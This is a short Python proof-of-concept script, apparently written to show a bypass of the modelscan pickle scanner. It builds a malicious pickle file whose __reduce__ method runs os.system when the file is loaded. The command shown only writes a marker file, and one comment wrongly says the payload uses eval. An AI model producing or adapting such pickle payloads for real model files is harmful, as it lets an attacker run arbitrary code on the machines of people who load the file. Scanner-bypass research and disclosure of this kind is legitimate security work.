# PoC Generator for modelscan Pickle Bypass
import pickle, os

class Pwn:
    def __reduce__(self):
        # This payload uses eval (in modelscan's blacklist) for clarity.
        # The real bypass is the marshal+types chain (see rce_payload.pkl).
        return (os.system, ('echo PWNED_P4 > pwned_p4.txt',))

if __name__ == '__main__':
    with open('rce_payload.pkl', 'wb') as f:
        pickle.dump(Pwn(), f)
    print('PoC generated: rce_payload.pkl')
